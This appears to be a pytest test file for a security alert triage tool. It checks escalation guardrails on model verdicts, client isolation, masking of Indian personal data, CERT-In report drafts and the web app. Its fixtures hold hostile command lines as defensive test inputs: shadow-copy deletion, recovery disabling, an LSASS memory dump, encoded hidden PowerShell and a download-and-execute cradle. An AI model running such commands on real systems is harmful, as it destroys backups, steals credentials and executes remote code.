"""
Run with:  python -m pytest -q
No network and no API key needed; model calls are stubbed.
"""
import json
import os
from datetime import datetime, timezone

import pytest

from app import privacy
from app.agent import backend, loop
from app.connectors.sources import normalize
from app.engine import certin, signals
from app.engine.correlate import correlate
from app.engine.triage import triage, _enforce_guardrails
from app.models import Verdict
from app.orchestrator import process_batch

ROOT = os.path.dirname(os.path.dirname(__file__))


def edr(**kw):
    raw = {"detection_id": kw.pop("id", "t-1"), "created_timestamp": "2026-11-01T10:00:00Z",
           "name": "x", "severity": "low", "hostname": "H1", "user_name": "u1", "description": ""}
    raw.update(kw)
    return normalize("crowdstrike_edr", raw, kw.get("client", "C1"))


def batch(*items):
    return process_batch(list(items))


def item(source, raw, client="C1"):
    return {"source": source, "client": client, "raw": raw}


# ---- the guarantee: risk signals always reach a human ----------------------

@pytest.mark.parametrize("fields", [
    {"name": "Ransomware behavior detected", "severity": "critical"},
    {"name": "Credential dumping via LSASS access", "severity": "high"},
    {"name": "Volume shadow copy administration", "cmdline": "vssadmin.exe delete shadows /all /quiet"},
    {"name": "Boot configuration modified", "cmdline": "bcdedit /set {default} recoveryenabled No"},
    {"name": "Process memory dump", "severity": "medium",
     "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\CyberArk\\o.dmp full"},
    {"name": "Scheduled task created", "cmdline": "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"},
])
def test_risk_signals_are_never_closed(fields):
    v = triage(edr(**fields))
    assert v.escalate is True and v.closure_code is None


def test_model_cannot_close_a_risk_signal():
    alert = edr(name="Ransomware behavior detected", severity="critical")
    said_benign = Verdict(alert.alert_id, "benign", "BENIGN_EXPECTED", 99, "low", False, "fine", "looks ok")
    v = _enforce_guardrails(said_benign, alert)
    assert v.escalate and v.closure_code is None and v.disposition != "benign"


def test_low_confidence_closure_is_reopened():
    alert = edr(name="Routine event")
    v = _enforce_guardrails(Verdict(alert.alert_id, "benign", "BENIGN_EXPECTED", 60, "low", False, "", ""), alert)
    assert v.escalate and v.closure_code is None


def test_made_up_closure_code_is_rejected():
    alert = edr(name="Routine event")
    v = _enforce_guardrails(Verdict(alert.alert_id, "benign", "TOTALLY_FINE", 99, "low", False, "", ""), alert)
    assert v.escalate and v.closure_code is None


# ---- the allowlist cannot be talked into closing an attack ------------------

def test_tool_name_in_text_is_not_enough():
    v = triage(edr(name="Remote service creation", severity="high", hostname="DC-01",
                   description="Service installed remotely; binary named sccm_update.exe",
                   cmdline="psexesvc.exe"))
    assert v.escalate

def test_cyberark_path_does_not_excuse_a_download():
    v = triage(edr(name="Suspicious PowerShell execution", severity="medium",
                   description="PowerShell from a folder named HP SoftPaq",
                   cmdline="powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\""))
    assert v.escalate

def test_real_admin_tools_still_close():
    for fields in ({"name": "Known admin tool: 1E Tachyon agent", "cmdline": "TachyonAgent.exe --inventory"},
                   {"name": "HP SoftPaq driver update flagged", "cmdline": "HPSoftPaqDownloadManager.exe"},
                   {"name": "Suspicious PowerShell execution", "severity": "medium",
                    "cmdline": "powershell.exe -File C:\\CyberArk\\PSM\\Components\\dispatch.ps1"}):
        v = triage(edr(**fields))
        assert not v.escalate and v.closure_code == "BENIGN_KNOWN_TOOL", fields

def test_admin_tool_at_high_severity_is_not_closed():
    assert triage(edr(name="Tachyon", severity="high", cmdline="TachyonAgent.exe --inventory")).escalate


# ---- scary-looking words in harmless places ---------------------------------

def test_hash_and_hostname_letters_do_not_trigger():
    a = edr(name="Software inventory scan", hostname="EC2-APP-01",
            sha256="4bc2a09e77d1f3c2aa5b6e0d9c81f2b7", cmdline="TachyonAgent.exe --inventory")
    assert signals.hard_signals(a) == []
    assert not triage(a).escalate

def test_bitlocker_is_not_ransomware():
    v = triage(edr(name="Disk encryption enabled", description="BitLocker encryption turned on by policy.",
                   cmdline="manage-bde -on C:"))
    assert not v.escalate

def test_sensitive_change_at_low_severity_is_not_closed():
    a = normalize("entra_id", {"id": "s1", "riskEventType": "New inbox rule", "riskLevel": "low",
                               "userPrincipalName": "a@x.example", "riskDetail": "forward all mail externally"}, "C1")
    assert triage(a).escalate


# ---- one client's data never touches another's ------------------------------

def _signin(i, client, ip="198.51.100.9", user="same.user@x.example"):
    return item("entra_id", {"id": i, "createdDateTime": "2026-11-01T10:00:00Z", "riskEventType": "Traffic",
                             "riskLevel": "low", "userPrincipalName": user, "ipAddress": ip,
                             "riskDetail": "routine"}, client)

def test_incidents_do_not_span_clients():
    r = batch(_signin("a1", "Client A"), _signin("b1", "Client B"))
    assert r["incidents"] == []

def test_investigation_only_sees_same_client():
    r = batch(_signin("a1", "Client A"), _signin("b1", "Client B"), _signin("b2", "Client B"))
    step = next(s for s in r["trails"]["a1"] if s["tool"] == "related_alerts")
    assert step["result_summary"].startswith("Found 0")

def test_linked_alerts_become_one_incident():
    with open(os.path.join(ROOT, "samples", "incoming_alerts.json")) as f:
        r = process_batch(json.load(f))
    meridian = [i for i in r["incidents"] if i["client"] == "Meridian Textiles"]
    assert len(meridian) == 1 and meridian[0]["size"] == 4
    seen = [aid for i in r["incidents"] for aid in i["alert_ids"]]
    assert len(seen) == len(set(seen)), "an alert is in two incidents"


# ---- response actions --------------------------------------------------------

def test_c2_alert_blocks_the_external_address_and_isolates_the_host():
    r = batch(item("fortinet_fw", {"logid": "f1", "eventtime": "2026-11-01T10:00:00Z",
                                   "attack": "Outbound connection to known C2", "crlevel": "high",
                                   "srcip": "FIN-07", "dstip": "203.0.113.150", "msg": "Beaconing."}))
    acts = {(a["action_type"], a["target"]) for a in r["actions"]["f1"]}
    assert ("isolate_host", "FIN-07") in acts and ("block_indicator", "203.0.113.150") in acts

def test_nothing_runs_without_approval():
    from app.engine.response import execute_action
    assert execute_action({"status": "pending", "label": "x", "target": "y", "platform": "z"})["ok"] is False


# ---- personal data masking ---------------------------------------------------

def _aadhaar():
    base = "23456789012"
    return base + privacy.verhoeff_check_digit(base)

def test_masking_round_trip():
    a = _aadhaar()
    text = f"Aadhaar {a[:4]} {a[4:8]} {a[8:]}, PAN ABCPK1234F, UPI ravi.k@okhdfcbank, mail r.k@corp.example.in, +91 9876543210"
    masked, mapping = privacy.mask(text)
    for secret in (a[:4], "ABCPK1234F", "okhdfcbank", "corp.example.in", "9876543210"):
        assert secret not in masked
    assert privacy.unmask(masked, mapping) == text
    assert privacy.summary(mapping) == {"AADHAAR": 1, "PAN": 1, "UPI": 1, "EMAIL": 1, "MOBILE": 1}

def test_masking_leaves_security_evidence_alone():
    text = "order 2345 6789 0123 hash 4bc2a09e77d1f3c2aa5b6e0d9c81f2b7 ip 10.20.5.20 host KPD-FS-01"
    assert privacy.mask(text)[0] == text      # 12 digits with a bad check digit is not an Aadhaar

def test_same_value_gets_same_placeholder():
    masked, _ = privacy.mask("PAN ABCPK1234F then again ABCPK1234F")
    assert masked.count("<PAN_1>") == 2


# ---- model backend (stubbed) -------------------------------------------------

class _Resp:
    def __init__(self, payload): self._p = payload
    def raise_for_status(self): pass
    def json(self): return self._p

@pytest.fixture
def gemini(monkeypatch):
    sent = []
    reply = {"text": "{}"}
    def post(url, headers=None, json=None, timeout=None):
        sent.append({"url": url, "headers": headers, "body": json})
        return _Resp({"candidates": [{"content": {"parts": [{"text": reply["text"]}]}}]})
    monkeypatch.setattr(backend, "BACKEND", "gemini")
    monkeypatch.setattr(backend, "MASK_PII", True)
    monkeypatch.setenv("GEMINI_API_KEY", "test-key")
    monkeypatch.setattr(backend.requests, "post", post)
    return sent, reply

def test_prompts_are_masked_before_they_leave(gemini):
    sent, reply = gemini
    a = _aadhaar()
    reply["text"] = '{"note": "seen <AADHAAR_1>"}'
    out = backend.complete("system", f"customer Aadhaar {a} PAN ABCPK1234F")
    wire = json.dumps(sent[0]["body"])
    assert a not in wire and "ABCPK1234F" not in wire
    assert "generativelanguage.googleapis.com" in sent[0]["url"] and sent[0]["headers"]["x-goog-api-key"] == "test-key"
    assert a in out                           # analyst still sees the real value

def test_model_verdict_is_still_subject_to_guardrails(gemini):
    sent, reply = gemini
    reply["text"] = json.dumps({"action": "conclude", "disposition": "benign", "closure_code": "BENIGN_EXPECTED",
                                "confidence": 99, "severity": "low", "escalate": False,
                                "summary": "fine", "reasoning": "nothing to see"})
    alert = edr(name="Ransomware behavior detected", severity="critical").to_dict()
    v, _ = loop.investigate(alert, [alert])
    assert v["escalate"] is True and v["closure_code"] is None and v["used_ai"] is True

def test_garbage_from_the_model_falls_back_to_rules(gemini):
    sent, reply = gemini
    reply["text"] = "I'm sorry, I can't help with that."
    alert = edr(name="Ransomware behavior detected", severity="critical").to_dict()
    v, trail = loop.investigate(alert, [alert])
    assert v["escalate"] is True and v["used_ai"] is False and len(trail) == 4

def test_model_outage_does_not_stop_triage(monkeypatch):
    import requests
    def boom(*a, **k): raise requests.ConnectionError("down")
    monkeypatch.setattr(backend, "BACKEND", "gemini")
    monkeypatch.setenv("GEMINI_API_KEY", "k")
    monkeypatch.setattr(backend.requests, "post", boom)
    alert = edr(name="Known admin tool", cmdline="TachyonAgent.exe --inventory").to_dict()
    v, _ = loop.investigate(alert, [alert])
    assert v["closure_code"] == "BENIGN_KNOWN_TOOL"


# ---- CERT-In draft -------------------------------------------------------------

def _sample():
    with open(os.path.join(ROOT, "samples", "incoming_alerts.json")) as f:
        r = process_batch(json.load(f))
    inc = next(i for i in r["incidents"] if i["client"] == "Meridian Textiles")
    members = sorted(({"alert": a, "verdict": r["verdicts"][a["alert_id"]]} for a in r["alerts"]
                      if a["alert_id"] in inc["alert_ids"]), key=lambda m: m["alert"]["timestamp"])
    return r, inc, members

def test_certin_clock_is_six_hours_from_first_escalated_alert():
    r, inc, members = _sample()
    d = certin.build_draft(inc, members, r["actions"], now=datetime(2026, 8, 14, 9, 40, tzinfo=timezone.utc))
    assert d["deadline_iso"].startswith("2026-08-14T14:40")      # 08:40Z + 6h
    assert d["minutes_remaining"] == 300 and d["overdue"] is False

def test_certin_draft_reports_overdue_honestly():
    r, inc, members = _sample()
    d = certin.build_draft(inc, members, r["actions"], now=datetime(2026, 8, 15, tzinfo=timezone.utc))
    assert d["overdue"] is True

def test_certin_draft_content():
    r, inc, members = _sample()
    d = certin.build_draft(inc, members, r["actions"], threat_intel={"185.220.101.44": "Known C2"})
    types = " | ".join(t["type"] for t in d["incident_types"])
    assert "Malicious code" in types and "Compromise of critical systems" in types and "Identity theft" in types
    assert any(s["name"] == "MRD-FIN-07" for s in d["systems"])
    assert any(i["value"] == "185.220.101.44" and i["intel"] == "Known C2" for i in d["indicators"])
    assert d["actions_done"] == [] and d["actions_pending"]       # nothing claimed as done until approved
    assert any("Reporting person" in t for t in d["to_complete"])

def test_no_draft_for_benign_incident():
    quiet = [{"alert": {"alert_id": "x"}, "verdict": {"escalate": False, "disposition": "benign"}}]
    assert certin.is_reportable_candidate(quiet) is False


# ---- web app -----------------------------------------------------------------

@pytest.fixture(autouse=True)
def _isolated_audit_log(tmp_path, monkeypatch):
    monkeypatch.setenv("TRIAGLE_AUDIT_LOG", str(tmp_path / "audit.jsonl"))


def _csrf(page):
    import re
    return re.search(r'name="csrf" value="([0-9a-f]+)"', page).group(1)


def _signed_in(username="admin", password="correct horse", users=""):
    from fastapi.testclient import TestClient
    from app import main, auth
    auth.load_config({"TRIAGLE_ADMIN_PASSWORD": "correct horse", "TRIAGLE_SECRET": "test-secret",
                      "TRIAGLE_USERS": users})
    main._CACHE.clear()
    c = TestClient(main.app)
    r = c.post("/login", data={"username": username, "password": password}, follow_redirects=False)
    assert r.status_code == 303, r.text
    return c


@pytest.fixture
def client():
    return _signed_in()

@pytest.mark.parametrize("path", ["/", "/tuning", "/benchmark", "/alert/ldt:aaa101",
                                  "/report/MRD-FIN-07", "/report/p.nair", "/certin/MRD-FIN-07", "/healthz"])
def test_pages_load(client, path):
    assert client.get(path).status_code == 200

@pytest.mark.parametrize("path", ["/alert/nope", "/report/nope", "/certin/nope"])
def test_unknown_ids_are_404_not_500(client, path):
    assert client.get(path).status_code == 404

def test_approval_flow_and_draft_reflects_it(client):
    page = client.get("/certin/MRD-FIN-07").text
    assert "None yet." in page
    token = _csrf(client.get("/alert/ldt:aaa101").text)
    r = client.post("/action/approve", data={"alert_id": "ldt:aaa101", "csrf": token,
                                             "action_id": "ldt:aaa101:isolate_host:MRD-FIN-07"},
                    follow_redirects=False)
    assert r.status_code == 303
    assert "[DRY-RUN]" in client.get("/alert/ldt:aaa101").text
    draft = client.get("/certin/MRD-FIN-07").text
    assert "Isolate host from network — MRD-FIN-07 (approved by admin" in draft


# ---- the benchmark itself -----------------------------------------------------

def test_benchmark_misses_no_labelled_threat():
    from eval.run_benchmark import run
    rows, summary, _, _ = run()
    missed = [r["title"] for r in rows if r["outcome"] == "MISSED"]
    assert missed == []
    assert summary["all"]["false_escalations"] <= 1


def test_demo_clock_keeps_order_and_puts_window_in_the_future(monkeypatch):
    from fastapi.testclient import TestClient
    from app import main
    monkeypatch.setenv("TRIAGLE_DEMO_CLOCK", "true")
    try:
        c = _signed_in()
        page = c.get("/certin/MRD-FIN-07").text
        assert "Demo clock is on" in page and ">window passed<" not in page and 'class="c good"><div class="l">Time left' in page
        times = [a["timestamp"] for a in main._CACHE["result"]["alerts"] if a["client"] == "Meridian Textiles"]
        assert times == sorted(times)
    finally:
        main._CACHE.clear()
